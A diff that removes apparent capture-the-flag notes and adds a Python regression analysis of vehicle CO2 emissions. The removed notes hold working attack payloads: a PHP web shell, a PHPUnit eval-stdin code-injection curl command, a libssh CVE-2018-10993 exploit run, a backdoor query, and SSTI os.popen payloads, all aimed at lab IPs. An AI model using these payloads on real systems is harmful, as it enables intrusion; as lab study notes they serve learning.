@@ -1,56 +1,74 @@
-1. Bolt:
+import pandas as pd
+import numpy as np
+import statsmodels.api as sm
+import matplotlib.pyplot as plt
+from sklearn.model_selection import train_test_split
+from sklearn.metrics import mean_squared_error, r2_score
+from statsmodels.graphics.regressionplots import plot_partregress_grid
 
-<?php echo system($_GET['cmd']);?>
-Find source. For this add "view-source:" at the very start of the link.
-Add /bolt/login to the link at the end, which takes you to the login screen.
-Wild-guess the password, combo is admin/password. Upload this code as a .html:
-<?php echo system($_GET[‘cmd’]);?>
-Afterwards, rename it to php. Go into the file, and start searching. First add
-cmd=id; then cmd=ls%20-l; lastly cmd=cat%20/flag.txt
+df = pd.read_csv('Fuel_Cost.csv')
+df.head()
+#მონაცემების გამოსახვა ბიბლიოეთეკით
 
-2.
+df.isnull().sum() #არასათანადო მონაცემების შემოწმება
+#ნაპოვნი არა გამოტოვებული მნიშვნელობები
 
-Elastic:msfconsole gamoikene thats it
-cve 2015 5531
+#ცხრილიდან ვიღებთ co2emisons
+X = df.drop(columns=["CO2EMISSIONS"])
+y = df["CO2EMISSIONS"]
+#ვაგებთ მოდელს
+X_const = sm.add_constant(X)
+model_full = sm.OLS(y, X_const).fit()
+model_full.summary()
 
+#Partial Regression Plots ვაგებთ
+fig = plt.figure(figsize=(12, 8))
+plot_partregress_grid(model_full, fig=fig)
+plt.tight_layout()
+plt.show()
 
-3. libssh:
+#ვარჩევთ მნიშვნელოვან ცვლადებს ამეებს ძლიერი გავლენა აქვთ
+selected_features = ["ENGINESIZE", "CYLINDERS", "FUELCONSUMPTION_COMB_MPG"]
+X_selected = df[selected_features]
 
-cve 2018-10993 githubidan mygeekys iwer
-python3 /home/kali/Desktop/libssh/cve-2018-10993.py  34.159.185.40 -p 32623 -c "ls /"
-python3 /home/kali/Desktop/libssh/cve-2018-10993.py  34.159.185.40 -p 32623 -c "cat / flag.txt"
+#train test გაყოფა
+X_train, X_test, y_train, y_test = train_test_split(
+    X_selected, y, test_size=0.15, random_state=42
+)
 
+#საბოლოო მოდელის აგება
+X_train_const = sm.add_constant(X_train)
+X_test_const = sm.add_constant(X_test)
+model_final = sm.OLS(y_train, X_train_const).fit()
+model_final.summary
 
-4. php unit:
+#პროგნოზი
+y_pred = model_final.predict(X_test_const)
 
-dirsearach usage. lurji chaketili direktoriebi ver shevalt. /composer.json -> version number
-mwvane-gvawkobs ra egenia gia.
+#შეფასება
+rmse = np.sqrt(mean_squared_error(y_test, y_pred))
+r2 = r2_score(y_test, y_pred)
+print("\nModel Evaluation:")
+print(f"RMSE: {rmse:.2f}")
+print(f"R^2: {r2:.4f}")
+#21.58 prediction error გვიჩვენებს ამ მოდელის სიზუსტეზე ეს მოდელი კარგია და ხსნის კანონზომიერებას
 
-Use the following:
-/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
-the command: curl -X POST
-35.242.218.207:32111//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data
-"<?php system('ls -la');?>"      php 5.6.2
+#Actual vs Predicted model comparison
+plt.figure(figsize=(8, 6))
+plt.scatter(y_test, y_pred, alpha=0.6)
+min_val = min(y_test.min(), y_pred.min())
+max_val = max(y_test.max(), y_pred.max())
+plt.plot([min_val, max_val], [min_val, max_val], linestyle='--')
+plt.xlabel("Actual CO2")
+plt.ylabel("Predicted CO2")
+plt.title("Actual vs Predicted CO2")
+plt.grid()
+plt.show()
 
-Use dirsearch:
-./dirsearch.py -u http://url -w ./db/dicc.txt
-Find composer.json, realise that the version 5.6.2 is vulnerable to code injection
-Open Burp, use code injection to run:
-<?php system('cat/flag.txt')?>
-
-5. non diff backdoor:
-
-A backdoor in pentesting is a covert method used to bypass normal authentication, providing unauthorized, persistent remote access to a system, application, or network.
-
-view-source:http://34.185.185.43:31753/?welldone=knockknock&shazam=cat%20flag.php -amoxsna
-unzip backup.zip -d backup                            grep -r "shell_exec"
-
-
-6. shark: 
-burpit vamowmebt server aris Server: Werkzeug/2.0.3 Python/3.6.9   reflected xss mushaobs.
-ssti vcadot server side template injection when the server runs your input as code instead of showing it as text
-${7*7}=gamoqvs 49
-
-${__import__('os').popen('ls').read()}
-${__import__('os').popen('cat flag').read()}
-${__import('os').popen('ls').read()}
+import seaborn as sns
+import matplotlib.pyplot as plt
+corr_matrix = df.corr()
+plt.figure(figsize=(10, 8))
+sns.heatmap(corr_matrix, annot=True, fmt=".2f", linewidths=0.5)
+plt.title("Correlation Heatmap")
+plt.show()
